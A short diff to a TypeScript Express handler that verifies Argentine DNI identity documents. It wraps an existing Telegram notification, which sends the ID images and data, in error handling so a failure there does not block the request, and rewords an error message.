@@ -60,14 +60,19 @@ export const verifyDNI = async (req: Request, res: Response): Promise<void> => {
       }
     }
 
-    // Enviar a Telegram con información completa
-    await sendDNINotification({
-      userId,
-      frontImage,
-      backImage,
-      timestamp: new Date().toLocaleString('es-AR'),
-      dniData,
-    });
+    // Enviar a Telegram con información completa (no bloquear si falla)
+    try {
+      await sendDNINotification({
+        userId,
+        frontImage,
+        backImage,
+        timestamp: new Date().toLocaleString('es-AR'),
+        dniData,
+      });
+    } catch (telegramError) {
+      console.error('Error en Telegram (no crítico):', telegramError);
+      // Continuar aunque Telegram falle
+    }
 
     res.json({ 
       success: true, 
@@ -77,7 +82,7 @@ export const verifyDNI = async (req: Request, res: Response): Promise<void> => {
     });
   } catch (error) {
     console.error('Error en verificación DNI:', error);
-    res.status(500).json({ error: 'Error al verificar DNI' });
+    res.status(500).json({ error: 'Error al verificar DNI. Por favor intenta nuevamente.' });
   }
 };
 
